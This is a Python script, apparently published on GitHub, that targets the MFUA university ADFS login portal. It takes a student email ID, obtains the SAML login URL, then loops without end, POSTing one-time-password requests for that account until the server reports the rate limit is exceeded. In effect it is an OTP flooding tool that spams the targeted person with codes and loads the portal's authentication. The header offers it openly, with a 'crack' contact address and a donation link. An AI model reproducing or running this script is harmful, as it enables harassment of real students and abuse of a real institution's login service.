"""
                    ✨ MFUA_ssp.py ✨

                    📦 Почта для обратной связи: mfua.crack@gmail.com
                    🎃 Лицензия: MIT license
                    ☕ Поддержать Автора: https://www.donationalerts.com/r/tot_camyi_coder
                    Код: https://github.com/tot-camiy-coder/MFUA_ssp.py
"""

# # # #
import requests
import pyfiglet
# # # #

# get SAML url
def SAMLRequest(mail):
    url = f'https://portal.mfua.ru/adfs/?AUTH_FORM=Y&TYPE=AUTH&user_name={mail}@s.mfua.ru&USER_LOGIN={mail}&domen=@s.mfua.ru'
    return requests.get(url, data=f'AuthMethod=MFUA+One-time+passwords&UserName={mail}@s.mfua.ru').url

# POST auth method
def work(mail):
    saml = SAMLRequest(mail)
    while True:
        try:
            r = requests.post(saml, data=f'AuthMethod=MFUA+One-time+passwords&UserName={mail}@s.mfua.ru')
            if r.status_code == 200:
                if "Превышено" in r.text:
                    print(f'[{mail}@s.mfua.ru] - Превышено количество запросов.')
                    break
                print(f'[{mail}@s.mfua.ru] - отправлено')
            else:
                print(f'[{mail}@s.mfua.ru] - {r.status_code}')
        except Exception as e:
            print(f'[{mail}] - ошибка: {e}')




# __start__
if __name__ == "__main__":
    print('# '*30)
    print(pyfiglet.figlet_format('MFUA_spp.py'))
    print('# '*30)
    print("source code: https://github.com/tot-camiy-coder/MFUA_ssp.py")
    print(" ")
    print('# '*5)
    mail = input("Введите почту: (пример 12345678@s.mfua.ru)\n>> ").split('@')[0]
    work(mail)
